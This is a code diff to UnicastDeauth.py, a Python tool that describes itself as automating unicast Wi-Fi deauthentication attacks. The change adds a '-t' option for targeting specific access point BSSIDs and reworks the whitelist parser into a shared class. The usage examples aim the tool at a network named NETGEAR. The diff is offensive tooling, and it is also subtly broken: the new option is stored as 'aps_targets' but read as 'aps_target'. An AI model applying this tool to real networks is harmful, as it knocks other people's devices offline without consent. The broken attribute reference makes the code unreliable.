@@ -7,7 +7,6 @@
 
 # TODO
 #
-# offer targeting bssids instead of an essid
 # add module docstring
 # check for protected management frames
 
@@ -31,8 +30,8 @@ class MsgException(Exception):
         return f'[!] Error! {self.message}:\n    {self.exception}'
 
 class AccessPoints:
-    def __init__(self):
-        self.bssids = set()
+    def __init__(self, bssids):
+        self.bssids = bssids.get_all() if isinstance(bssids, AccessPointsParser) else set()
     
     def __contains__(self, bssid):
         return bssid in self.bssids
@@ -43,6 +42,21 @@ class AccessPoints:
             f'AP detected for network {essid}'
             f'\n    access point = {bssid}'
         )
+
+class AccessPointsParser:
+    def __init__(self, bssids_string):
+        self.bssids = set()
+        self.bssid_regex = re_compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
+        for bssid in bssids_string.split(','):
+            bssid = bssid.strip().lower()
+            if self.bssid_regex.match(bssid):
+                self.bssids.add(bssid)
+    
+    def __contains__(self, bssid):
+        return bssid in self.bssids
+    
+    def get_all(self):
+        return self.bssids
 
 class Stations:
     def __init__(self):
@@ -58,18 +72,6 @@ class Stations:
             f'\n    station      = {bssid_sta}'
             f'\n    access point = {bssid_ap}'
         )
-
-class AccessPointsWhitelist:
-    def __init__(self, bssids_string):
-        self.bssids = set()
-        self.bssid_regex = re_compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
-        for bssid in bssids_string.split(','):
-            bssid = bssid.strip().lower()
-            if self.bssid_regex.match(bssid):
-                self.bssids.add(bssid)
-    
-    def __contains__(self, bssid):
-        return bssid in self.bssids
 
 def panic(msg_exception):
     '''exception handling'''
@@ -214,9 +216,10 @@ def main():
     
     try:
         examples = [
-            'UnicastDeauth.py -i wlan0 -e target -b',
-            'UnicastDeauth.py -i wlan0 -e target -n 8',
-            'UnicastDeauth.py -i wlan0 -e target -wl 00:11:22:33:44:00,00:11:22:33:44:55',
+            'UnicastDeauth.py -i wlan0 -e NETGEAR -b',
+            'UnicastDeauth.py -i wlan0 -e NETGEAR -n 8',
+            'UnicastDeauth.py -i wlan0 -e NETGEAR -t 00:11:22:33:44:00,00:11:22:33:44:55',
+            'UnicastDeauth.py -i wlan0 -e NETGEAR -wl 00:11:22:33:44:00,00:11:22:33:44:55',
         ]
         parser = argparse.ArgumentParser(
             description = 'UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks',
@@ -251,11 +254,19 @@ def main():
             default = 1,
         )
         parser.add_argument(
+            '-t',
+            dest = 'aps_targets',
+            help = 'comma-separated known target APs',
+            required = False,
+            type = AccessPointsParser,
+            default = [],
+        )
+        parser.add_argument(
             '-wl',
             dest = 'aps_whitelist',
             help = 'comma-separated APs whitelist',
             required = False,
-            type = AccessPointsWhitelist,
+            type = AccessPointsParser,
             default = [],
         )
         args = parser.parse_args()
@@ -266,7 +277,7 @@ def main():
             'wlan type ctl',
             'wlan type data',
         ]
-        access_points = AccessPoints()
+        access_points = AccessPoints(args.aps_target)
         stations = Stations()
         sendrecv.sniff(
             iface = args.wifi_interface,
